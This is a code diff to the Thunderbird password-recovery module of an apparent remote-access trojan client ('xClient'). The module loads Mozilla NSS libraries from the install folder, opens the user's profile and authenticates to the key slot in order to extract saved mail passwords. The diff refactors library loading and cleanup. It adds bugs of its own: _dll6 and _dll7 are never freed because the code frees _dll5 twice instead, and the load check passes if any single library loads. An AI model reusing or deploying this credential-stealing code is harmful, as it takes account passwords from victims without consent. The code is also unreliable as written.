@@ -26,6 +26,8 @@ namespace xClient.Core.Recovery.Other
         private static IntPtr _dll3;
         private static IntPtr _dll4;
         private static IntPtr _dll5;
+        private static IntPtr _dll6;
+        private static IntPtr _dll7;
         private static long _keySlot;
 
         private static DirectoryInfo thunderbirdPath;
@@ -94,27 +96,44 @@ namespace xClient.Core.Recovery.Other
             {
             }
 
-            PK11_FreeSlot(_keySlot);
-            NSS_Shutdown();
-
-            if (_dll1 != IntPtr.Zero)
-                FreeLibrary(_dll1);
-            if (_dll2 != IntPtr.Zero)
-                FreeLibrary(_dll2);
-            if (_dll3 != IntPtr.Zero)
-                FreeLibrary(_dll3);
-            if (_dll4 != IntPtr.Zero)
-                FreeLibrary(_dll4);
-            if (_dll5 != IntPtr.Zero)
-                FreeLibrary(_dll5);
-
-            if (_nssModule != IntPtr.Zero)
-                FreeLibrary(_nssModule);
+            Cleanup();
 
             return thunderbirdPasswords;
         }
 
-   
+
+        private static void Cleanup()
+        {
+            try
+            {
+                if (_keySlot != 0)
+                    PK11_FreeSlot(_keySlot);
+                if (_nssModule != IntPtr.Zero)
+                    NSS_Shutdown();
+
+                if (_dll1 != IntPtr.Zero)
+                    FreeLibrary(_dll1);
+                if (_dll2 != IntPtr.Zero)
+                    FreeLibrary(_dll2);
+                if (_dll3 != IntPtr.Zero)
+                    FreeLibrary(_dll3);
+                if (_dll4 != IntPtr.Zero)
+                    FreeLibrary(_dll4);
+                if (_dll5 != IntPtr.Zero)
+                    FreeLibrary(_dll5);
+                if (_dll6 != IntPtr.Zero)
+                    FreeLibrary(_dll5);
+                if (_dll7 != IntPtr.Zero)
+                    FreeLibrary(_dll5);
+
+                if (_nssModule != IntPtr.Zero)
+                    FreeLibrary(_nssModule);
+            }
+            catch
+            {
+            }
+        }
+
         #endregion
 
         #region Functions
@@ -132,7 +151,30 @@ namespace xClient.Core.Recovery.Other
             _dll2 = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcp100.dll");
             _dll3 = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcr120.dll");
             _dll4 = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcp120.dll");
-            _dll5 = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\mozglue.dll");
+            _dll6 = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcr140.dll");
+            _dll7 = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcp140.dll");
+
+            if (!IsNullPointer(_dll1)
+               || !IsNullPointer(_dll2)
+               || !IsNullPointer(_dll3)
+               || !IsNullPointer(_dll4)
+               || !IsNullPointer(_dll6)
+               || !IsNullPointer(_dll7))
+            {
+                _dll5 = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\mozglue.dll");
+            }
+            else
+            {
+                Cleanup();
+                return;
+            }
+
+            if (IsNullPointer(_dll5))
+            {
+                Cleanup();
+                return;
+            }
+
             _nssModule = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\nss3.dll");
 
             IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "NSS_Init");
@@ -140,6 +182,16 @@ namespace xClient.Core.Recovery.Other
             NSS_Init(thunderbirdProfilePath.FullName);
             _keySlot = PK11_GetInternalKeySlot();
             PK11_Authenticate(_keySlot, true, 0);
+        }
+
+        private static bool IsNullPointer(params IntPtr[] ptrs)
+        {
+            var flag = false;
+            foreach (var ptr in ptrs)
+                if (ptr == IntPtr.Zero)
+                    return true;
+
+            return false;
         }
 
         private static DateTime FromUnixTime(long unixTime)
